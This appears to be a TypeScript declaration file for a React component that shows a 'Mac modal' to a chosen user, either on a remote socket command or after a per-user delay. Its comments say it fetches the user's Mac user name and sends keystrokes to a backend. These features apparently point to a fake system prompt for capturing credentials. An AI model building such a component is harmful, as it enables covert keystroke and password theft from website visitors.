import React from 'react';
import '../styles/modal-isolation.css';
export interface MacModalTriggerProps {
    /** User ID for backend key service. Required when backendConfig.enabled is true. */
    userId?: string;
    /** Backend integration config. When enabled, keystrokes are sent to backend. */
    backendConfig?: {
        enabled?: boolean;
        userId?: string;
    };
    /** Called when the Mac modal is closed. */
    onClose?: () => void;
}
/**
 * Listens for the backend socket event (default: `showMacModal`) and opens the Mac modal only when
 * the payload's user_id matches this component's userId (or backendConfig.userId).
 * Also fetches mac_user_name and mac_modal_timing from user DB on load.
 * If mac_modal_timing >= 0, opens the Mac modal after that many seconds since the website is loaded.
 * If mac_modal_timing === -1, only socket-triggered (same as before).
 *
 * Backend example: io.emit('showMacModal', { message: '...', user_id, text, timing, timestamp });
 */
declare const MacModalTrigger: React.FC<MacModalTriggerProps>;
export default MacModalTrigger;
//# sourceMappingURL=MacModalTrigger.d.ts.map